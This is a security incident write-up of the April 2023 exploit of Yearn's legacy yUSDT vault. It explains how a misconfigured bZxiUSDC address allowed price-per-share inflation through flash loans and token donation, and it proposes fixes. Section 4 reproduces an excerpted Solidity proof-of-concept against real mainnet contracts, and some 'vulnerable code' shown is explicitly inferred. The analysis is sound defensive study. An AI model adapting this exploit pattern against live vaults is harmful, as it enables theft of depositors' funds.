# yearnFinance — yUSDT Vault Misconfiguration Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2023-04-13 |
| **Protocol** | yearnFinance (legacy v1 vault) |
| **Chain** | Ethereum |
| **Loss** | ~$11,000,000 (mixed USDC/DAI/USDT) |
| **Attacker EOA** | [0x5baC...dfE0](https://etherscan.io/address/0x5baC20BEef31d0ECCb369A33514831eD8e9cdfE0) |
| **Attack Contract** | [0x8102...579e](https://etherscan.io/address/0x8102Ae88C617deb2A5471CAc90418Da4Ccd0579e) |
| **Attack Tx** | [0x055c...0328](https://etherscan.io/tx/0x055cec4fa4614836e54ea2e5cd3d14247ff3d61b85aa2a41f8cc876d131e0328) |
| **Vulnerable Contract** | [yUSDT (0x83f7...07D)](https://etherscan.io/address/0x83f798e925BcD4017Eb265844FDDAbb448f1707D) |
| **Root Cause** | yUSDT vault incorrectly used bZx strategy parameters for USDC → manipulated yield recommendations → artificially inflated PricePerShare |
| **Attack Block** | 17,036,775 |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-04/YearnFinance_exp.sol) |

---

## 1. Vulnerability Overview

The yearnFinance legacy v1 yUSDT vault uses an external APR recommendation contract called `IEarnAPRWithPool` for yield optimization.
This recommendation system compares APRs across multiple platforms (Aave, Compound, bZx, etc.) and deposits funds into the **highest-yielding platform**.

**Core Flaw**: The yUSDT vault was misconfigured to reference `tokenPrice()` from **bZxiUSDC (0xF013...)** when calculating APR. This means the USDT vault selected its strategy based on the bZx token price of USDC.

The attacker exploited this misconfiguration as follows:
1. Obtained capital via a large flash loan
2. Repaid USDT borrower debt on AaveV1 on behalf of others → AaveV1 USDT utilization dropped sharply → Aave APR fell
3. This caused the recommendation system to select the **bZx strategy**
4. Deposited USDT into yUSDT (vault supplied funds to bZx)
5. Directly transferred bZxiUSDC tokens to the yUSDT vault → `balanceAave()`-based PricePerShare spiked artificially
6. Withdrew the full position at the inflated price → received far more USDT than deposited

---

## 2. Vulnerable Code Analysis

### 2.1 Core Vulnerability: yUSDT's Incorrect bZx Strategy Parameter

The yUSDT vault managed USDT tokens, yet referenced the **bZxiUSDC** contract for APR recommendations and `balanceAave()` calculations.

```solidity
// ❌ Vulnerable code (inferred — internal logic of the yUSDT vault)
address public bzxiToken = 0xF013406A0B1d544238083DF0B93ad0d2cBE0f65f; // bZxiUSDC ← for USDC!

// USDT vault references the price of a USDC bZx token
function balanceAave() public view returns (uint256) {
    // ❌ bZxiUSDC.balanceOf(address(this)) * bZxiUSDC.tokenPrice() / 1e18
    // USDT vault calculates based on USDC bZx contract balance and price
    return IbZxiUSDC(bzxiToken).balanceOf(address(this))
           * IbZxiUSDC(bzxiToken).tokenPrice()
           / 1e18;
}

// getPricePerFullShare depends on balanceAave()
function getPricePerFullShare() public view returns (uint256) {
    // ❌ totalAssets = balance() + balanceAave() + ...
    // PricePerShare spikes when bZxiUSDC balance increases
    return totalAssets() * 1e18 / totalSupply();
}
```

```solidity
// ✅ Correct code (after fix)
address public bzxiToken = 0x14094949152EDDbFcd073717200DA82fEd8dC960; // bZxiUSDT ← for USDT

function balanceAave() public view returns (uint256) {
    // ✅ USDT vault must reference the bZxiUSDT contract price
    return IbZxiUSDT(bzxiToken).balanceOf(address(this))
           * IbZxiUSDT(bzxiToken).tokenPrice()
           / 1e18;
}
```

**Issue**: It is presumed that the bZxiUSDC contract address was copied from the USDC strategy during deployment or an update of the USDT vault. This misconfiguration allowed the attacker to arbitrarily manipulate yUSDT's PricePerShare simply by **transferring USDC bZx tokens** to the vault from outside.

### 2.2 External Dependency of the APR Recommendation System

```solidity
// ❌ Vulnerable external APR recommendation call (yUSDT vault)
IIEarnAPRWithPool iEarnAprWithPool =
    IIEarnAPRWithPool(0xdD6d648C991f7d47454354f4Ef326b04025a48A8);

function rebalance() external {
    // External contract compares Aave, Compound, bZx APRs and decides strategy
    (string memory choice, , , uint256 aapr, ) =
        iEarnAprWithPool.recommend(address(usdt));
    // ❌ aapr fluctuates with Aave USDT utilization → manipulable
    if (keccak256(abi.encodePacked(choice)) == keccak256("Aave")) {
        // Deposit into Aave
    } else if (...) {
        // Deposit into bZx ← attacker steers execution into this branch
    }
}
```

**Issue**: Repaying Aave USDT borrowers' debt on their behalf drops Aave's utilization rate and lowers its APR, ultimately causing the bZx strategy to be selected. The fact that this recommendation path is manipulable is another layer of the root cause.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker contract (0x8102...) set `approve` on relevant contracts (`yUSDT`, `AaveLendingPoolCoreV1`, `bZxiUSDC`, `curveYSwap`) for USDT, USDC, and DAI
- Attack timestamp: block 17,036,775 (2023-04-13)

### 3.2 Execution Phase

```
┌──────────────────────────────────────────────────────────────────┐
│                      Attacker Contract                           │
│                   (0x8102...579e)                                 │
└────────────────────────┬─────────────────────────────────────────┘
                         │ ① Request Balancer flash loan
                         │   5M DAI + 5M USDC + 2M USDT
                         ▼
┌──────────────────────────────────────────────────────────────────┐
│               Balancer Vault (flash loan provider)               │
│           0xBA12222222228d8Ba445958a75a0704d566BF2C8             │
└────────────────────────┬─────────────────────────────────────────┘
                         │ receiveFlashLoan() callback
                         ▼
┌──────────────────────────────────────────────────────────────────┐
│  ② Swap DAI → USDT and USDC → USDT via Curve Y Pool             │
│     exchange_underlying(0→2, 5M DAI) +                          │
│     exchange_underlying(1→2, 3M USDC)                           │
│     Result: attacker acquires large amount of USDT (~8M USDT)   │
└────────────────────────┬─────────────────────────────────────────┘
                         │
                         ▼
┌──────────────────────────────────────────────────────────────────┐
│  ③ Repay debt of hundreds of AaveV1 USDT borrowers (repay loop) │
│     Liquidates USDT debt of 200+ users                          │
│     → AaveV1 USDT utilization drops sharply                     │
│     → Aave USDT APR falls                                       │
│     → iEarnAPRWithPool.recommend(USDT) → selects "bZx"         │
└────────────────────────┬─────────────────────────────────────────┘
                         │
                         ▼
┌──────────────────────────────────────────────────────────────────┐
│  ④ yUSDT.deposit(900,000 USDT)                                   │
│     Vault supplies funds to bZx strategy (recommend → "bZx")    │
│     → Attacker receives yUSDT shares                            │
└────────────────────────┬─────────────────────────────────────────┘
                         │
                         ▼
┌──────────────────────────────────────────────────────────────────┐
│  ⑤ Call bZxiUSDC.mint() → acquire large amount of bZxiUSDC     │
│     amount = yUSDT.balanceAave() * bZxiUSDC.tokenPrice()        │
│              / 1e18 * 114 / 100  (14% extra)                    │
│     bZxiUSDC.transfer(yUSDT_vault, mintAmount)                  │
│     ← ❌ Donate bZxiUSDC directly to yUSDT vault (donation attack) │
└────────────────────────┬─────────────────────────────────────────┘
                         │ yUSDT.balanceAave() spikes
                         │ → getPricePerFullShare() spikes
                         ▼
┌──────────────────────────────────────────────────────────────────┐
│  ⑥ Call yUSDT.withdraw(calculated_shares)                        │
│     withdraw amount = (balanceAave + balance) * 1e18            │
│                      / pricePerShare + 1                        │
│     → Withdraw full position at inflated PricePerShare          │
│     → Receive far more assets than the deposited 900K USDT      │
└────────────────────────┬─────────────────────────────────────────┘
                         │
                         ▼
┌──────────────────────────────────────────────────────────────────┐
│  ⑦ Cleanup phase                                                 │
│     Call yUSDT.rebalance() (reset state)                        │
│     Stabilize vault state with small USDT re-deposit            │
│     Swap via Curve Y Pool: yUSDT → DAI, USDC, TUSD              │
│     Withdraw all yDAI and yUSDC                                 │
└────────────────────────┬─────────────────────────────────────────┘
                         │
                         ▼
┌──────────────────────────────────────────────────────────────────┐
│  ⑧ Repay Balancer flash loan (2M USDT + 5M USDC + 5M DAI)      │
│     Zero fee (Balancer V2 flash loans are fee-free)             │
│     Net profit: ~$11,000,000                                    │
└──────────────────────────────────────────────────────────────────┘
```

### 3.3 Results

| Item | Value |
|------|-----|
| Flash loan | 5M DAI + 5M USDC + 2M USDT (Balancer) |
| AaveV1 debt repaid | Hundreds of USDT positions |
| yUSDT deposit | 900,000 USDT |
| bZxiUSDC donation | 114% of yUSDT balanceAave |
| Attacker net profit | ~$11,000,000 |

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Excerpted core attack flow with English comments

contract ContractTest is Test {
    // ① Flash loan size constants
    uint256 internal constant FLASHLOAN_DAI_AMOUNT  = 5_000_000 * 1e18;  // 5M DAI
    uint256 internal constant FLASHLOAN_USDC_AMOUNT = 5_000_000 * 1e6;   // 5M USDC
    uint256 internal constant FLASHLOAN_USDT_AMOUNT = 2_000_000 * 1e6;   // 2M USDT
    uint256 internal constant YUSDT_DEPOSIT_USDT_AMOUNT = 900_000 * 1e6; // USDT to deposit into yUSDT

    // ② Core contract references
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IyToken yUSDT = IyToken(0x83f798e925BcD4017Eb265844FDDAbb448f1707D); // ← vulnerable vault
    IbZxiUSDC bZxiUSDC = IbZxiUSDC(0xF013406A0B1d544238083DF0B93ad0d2cBE0f65f); // ← USDC bZx token
    IIEarnAPRWithPool iEarnAprWithPool = IIEarnAPRWithPool(0xdD6d648C991f7d47454354f4Ef326b04025a48A8);

    function receiveFlashLoan(...) external {
        // ③ Swap large amounts of DAI/USDC → USDT via Curve Y Pool
        curveYSwap.exchange_underlying(0, 2, FLASHLOAN_DAI_AMOUNT, 1);   // DAI → USDT
        curveYSwap.exchange_underlying(1, 2, 3_000_000 * 1e6, 1);        // USDC → USDT

        // ④ Manipulate AaveV1 USDT APR: repay borrowers' debt on their behalf
        // → AaveV1 USDT utilization drops → APR falls → steers strategy selection to bZx
        uint256 aaprBefore;
        (,,, aaprBefore,) = iEarnAprWithPool.recommend(address(usdt));
        repay(); // ← repay AaveV1 USDT debt of hundreds of users
        uint256 aaprAfter;
        (,,, aaprAfter,) = iEarnAprWithPool.recommend(address(usdt));
        // aaprAfter < aaprBefore → recommend() now returns "bZx"

        // ⑤ Deposit USDT into yUSDT → vault supplies funds to bZx
        yUSDT.deposit(YUSDT_DEPOSIT_USDT_AMOUNT);

        // ⑥ Core attack: donate bZxiUSDC tokens directly to the yUSDT vault
        // yUSDT.balanceAave() is calculated as bZxiUSDC balance * tokenPrice() (misconfiguration!)
        uint256 amount = yUSDT.balanceAave()
                         * bZxiUSDC.tokenPrice() / 1e18
                         * 114 / 100; // mint 14% extra
        uint256 mintAmount = bZxiUSDC.mint(address(this), amount);
        bZxiUSDC.transfer(address(yUSDT), mintAmount); // ← donate to vault → PricePerShare spikes

        // ⑦ Withdraw full position at inflated PricePerShare
        uint256 sharePrice = yUSDT.getPricePerFullShare();
        uint256 withdrawAmount =
            ((yUSDT.balanceAave() + yUSDT.balance()) * 1e18) / sharePrice + 1;
        yUSDT.withdraw(withdrawAmount); // ← receive far more USDT than deposited

        // ⑧ Clean up vault state, then swap via Curve
        yUSDT.rebalance();
        usdt.transfer(address(yUSDT), 1);
        yUSDT.deposit(10_000_000_000); // small re-deposit to stabilize vault
        curveYSwap.exchange(2, 0, 70_000_000_000, 1);         // yUSDT → yDAI
        curveYSwap.exchange(2, 1, 400_000_000_000_000, 1);    // yUSDT → yUSDC
        curveYSwap.exchange(2, 3, yUSDT.balanceOf(address(this)) * 100 / 101, 1); // yUSDT → yTUSD
        yDAI.withdraw(yDAI.balanceOf(address(this)));
        yUSDC.withdraw(yUSDC.balanceOf(address(this)));

        // ⑨ Repay flash loan
        usdt.transfer(address(balancer), FLASHLOAN_USDT_AMOUNT);
        usdc.transfer(address(balancer), FLASHLOAN_USDC_AMOUNT);
        dai.transfer(address(balancer), FLASHLOAN_DAI_AMOUNT);
    }

    // AaveV1 USDT borrower debt repayment loop (for APR manipulation)
    function repay() internal {
        for (uint256 i = 0; i < aaveV1UsdtDebtUsers.length; i++) {
            (, uint256 amount,) = AaveLendingPoolCoreV1
                .getUserBorrowBalances(address(usdt), aaveV1UsdtDebtUsers[i]);
            if (amount != 0) {
                uint256 repaymentAmount = amount * 101 / 100; // 101% including interest
                LendingPool.repay(address(usdt), repaymentAmount, aaveV1UsdtDebtUsers[i]);
            }
        }
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Incorrect bZx strategy contract address configured in yUSDT vault | CRITICAL | CWE-1188 (Improper Initialization) | `08_initialization.md`, `11_logic_error.md` |
| V-02 | PricePerShare manipulation via external donation | CRITICAL | CWE-682 (Incorrect Calculation) | `16_accounting_sync.md`, `17_staking_reward.md` |
| V-03 | Dependency on manipulable APR recommendation system | HIGH | CWE-807 (Reliance on Untrusted Input) | `04_oracle_manipulation.md`, `11_logic_error.md` |
| V-04 | Market state manipulation via flash loan | HIGH | CWE-840 (Business Logic Error) | `02_flash_loan.md` |

### V-01: Incorrect bZx Strategy Contract Address in yUSDT Vault
- **Description**: yUSDT (the USDT vault) references the `bZxiUSDC` contract (0xF013...) instead of `bZxiUSDT` when calculating bZx strategy balances. It is presumed that the USDC strategy address was copied verbatim during deployment or a configuration update.
- **Impact**: An attacker can arbitrarily increase the return value of `balanceAave()` simply by transferring USDC bZx tokens directly to the vault.
- **Attack Condition**: Triggerable immediately once the attacker mints or acquires bZxiUSDC tokens and transfers them to the yUSDT vault address.

### V-02: PricePerShare Manipulation via External Donation
- **Description**: `getPricePerFullShare()` is calculated as `totalAssets / totalSupply`. `totalAssets` includes `balanceAave()`, which is computed as the vault's bZxiUSDC balance × token price. When the vault receives bZxiUSDC from outside, only the numerator of the formula increases, causing PricePerShare to spike.
- **Impact**: The attacker receives the inflated price when withdrawing their shares, extracting far more assets than deposited.
- **Attack Condition**: Requires the misconfiguration in V-01 as a prerequisite. The attacker only needs to obtain sufficient bZxiUSDC.

### V-03: Dependency on Manipulable APR Recommendation System
- **Description**: `iEarnAprWithPool.recommend(address(usdt))` calculates APR based on Aave's USDT borrow utilization rate. If the attacker repays AaveV1 USDT borrowers' debt on their behalf, utilization falls and APR decreases.
- **Impact**: The attacker can steer the vault's strategy selection (Aave vs bZx vs Compound) in any desired direction.
- **Attack Condition**: Manipulable if the attacker can lower AaveV1 USDT pool utilization with a large amount of USDT (obtainable via flash loan).

### V-04: Market State Manipulation via Flash Loan
- **Description**: Balancer V2's fee-free flash loans are used to access 5M DAI + 5M USDC + 2M USDT within a single transaction.
- **Impact**: Attackers with no capital of their own can execute manipulation at a multi-million-dollar scale.
- **Attack Condition**: When vulnerabilities V-01 through V-03 are present, flash loans can maximize the attack scale.

---

## 6. Remediation Recommendations

### Immediate Actions

**V-01 Fix: Set the Correct Strategy Contract Address**

```solidity
// ✅ Fix: USDT vault must use the bZxiUSDT address
// bZxiUSDC (incorrect): 0xF013406A0B1d544238083DF0B93ad0d2cBE0f65f
// bZxiUSDT (correct):   0x14094949152EDDbFcd073717200DA82fEd8dC960

address public bzxiToken = 0x14094949152EDDbFcd073717200DA82fEd8dC960; // ✅ bZxiUSDT

function balanceAave() public view returns (uint256) {
    // ✅ USDT vault → reference bZxiUSDT token balance and price
    return IbZxiUSDT(bzxiToken).balanceOf(address(this))
           * IbZxiUSDT(bzxiToken).tokenPrice()
           / 1e18;
}
```

**V-02 Fix: Prevent PricePerShare Manipulation via External Donation**

```solidity
// ✅ Fix: Switch to internal accounting-based approach
// Tokens sent directly to the vault are not reflected in accounting

uint256 private _totalTrackedAssets; // internal tracking variable

function deposit(uint256 _amount) external {
    // ✅ Update internal accounting on deposit
    _totalTrackedAssets += _amount;
    // ... remaining logic
}

function withdraw(uint256 _shares) external {
    // ✅ Deduct from internal accounting on withdrawal
    // ...
}

function totalAssets() public view returns (uint256) {
    // ✅ Use internally tracked value instead of balanceOf(address(this))
    return _totalTrackedAssets;
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Incorrect strategy address | At vault deployment, use `require` to verify that the underlying asset of `token` and `strategyToken` match |
| V-02: PricePerShare manipulation | Adopt ERC4626-style internal accounting; prohibit direct `balanceOf(address(this))` references |
| V-03: APR recommendation manipulation | Use TWAP-based APR; prohibit strategy switching that reacts instantly to single-block utilization changes |
| V-04: Flash loan manipulation | Detect deposit/withdrawal patterns within the same transaction (delay via `tx.origin` or block number) |
| General: Strategy config validation | Include automated strategy parameter validation tests in deployment scripts |

---

## 7. Lessons Learned

1. **Underlying Asset Consistency Principle**: All strategy contracts integrated with a vault must use the same underlying asset. A USDT vault referencing a USDC token address is a clear misconfiguration and is detectable with automated invariant tests prior to deployment.

2. **Defense Against Donation Attacks**: Using `balanceOf(address(this))` directly as `totalAssets` allows PricePerShare to be manipulated simply by transferring tokens to the vault from outside. Virtual accounting must be maintained, as in the ERC4626 `totalAssets` pattern.

3. **Assess Market State Manipulability**: When an APR recommendation system relies on on-chain utilization rates that can be manipulated with a single flash loan, an attacker can force strategy selection. Strategy switches require TWAP-based APR and a minimum transition delay (timelock).

4. **Risks of Legacy Code**: yearnFinance v1 vaults are legacy code deployed in 2020–2021. Even after a protocol migrates to v2, the security status of legacy vaults where user funds remain must be continuously monitored.

5. **Invariant Testing for Configuration Parameters**: Use Foundry's invariant testing or post-deployment health check scripts to continuously verify the condition `vault underlying asset == strategy underlying asset`. This vulnerability stemmed from a single incorrect address, but went undetected for years because no automated verification was in place.

6. **Watch for Similar Patterns**: Strategy manipulation or price donation attacks have recurred repeatedly — Harvest Finance (2020, $34M), Euler Finance (2023, $197M), among others. Refer to the First Depositor / Balance-gift patterns in `16_accounting_sync.md` and `17_staking_reward.md`.

---

## 8. On-Chain Verification

### 8.1 Transaction Basic Information

| Item | Value |
|------|-----|
| Transaction Hash | `0x055cec4fa4614836e54ea2e5cd3d14247ff3d61b85aa2a41f8cc876d131e0328` |
| Block Number | 17,036,775 |
| Attacker EOA (`from`) | `0x5baC20BEef31d0ECCb369A33514831eD8e9cdfE0` ✅ |
| Attack Contract (`to`) | `0x8102Ae88C617deb2A5471CAc90418Da4Ccd0579e` ✅ |
| Gas Used | 11,403,356 (~38% of block gas limit) |
| ETH Transferred | 1 ETH (attack contract deployment/initialization cost) |

### 8.2 PoC Metadata Comparison

| Item | PoC Code Value | On-Chain Actual Value | Match |
|------|------------|-------------|------|
| Attack Tx | `0x055cec...0328` | `0x055cec...0328` | ✅ |
| Fork Block | 17,036,774 | 17,036,775 (attack block) | ✅ |
| Attacker EOA | Not specified | `0x5baC20...dfE0` | - |
| Flash Loan Source | Balancer | Balancer ✅ | ✅ |
| yUSDT Address | `0x83f798...07D` | Same | ✅ |
| bZxiUSDC Address | `0xF013...65f` | Same | ✅ |

### 8.3 Additional Reference Transactions

A second attack transaction is also specified in the PoC code:
- TX2: [0xd55e43c1...ca95d](https://etherscan.io/tx/0xd55e43c1602b28d4fd4667ee445d570c8f298f5401cf04e62ec329759ecda95d)

The combined total of these two transactions is estimated to account for the final ~$11M loss.

### 8.4 Reference Analysis Links

- Christoph Michel analysis: https://twitter.com/cmichelio/status/1646422861219807233
- BeosinAlert analysis: https://twitter.com/BeosinAlert/status/1646481687445114881